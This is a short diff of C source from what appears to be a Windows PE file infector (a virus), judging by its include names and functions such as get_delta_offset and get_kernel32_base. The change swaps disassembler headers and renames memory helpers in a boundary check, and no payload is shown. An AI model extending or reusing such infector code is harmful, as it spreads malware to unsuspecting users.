@@ -4,10 +4,8 @@
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
-#include "disasm/analysis/analysis.h"
 #include "disasm/analysis/block.h"
-#include "disasm/analysis/call.h"
-#include "disasm/analysis/function.h"
+#include "disasm/analysis/reference.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -69,8 +67,9 @@ static uint8_t check_functions(void) {
            IN_BOUNDARIES(create_section_header) && IN_BOUNDARIES(get_teb) &&
            IN_BOUNDARIES(get_peb) && IN_BOUNDARIES(get_image_base) &&
            IN_BOUNDARIES(get_kernel32_base) &&
-           IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero) &&
-           IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive) &&
+           IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero_local) &&
+           IN_BOUNDARIES(memcpy_local) &&
+           IN_BOUNDARIES(same_case_insensitive) &&
            IN_BOUNDARIES(get_function_pointer) && IN_BOUNDARIES(setup_disasm) &&
            IN_BOUNDARIES(set_next_address) &&
            IN_BOUNDARIES(get_current_instruction_size);
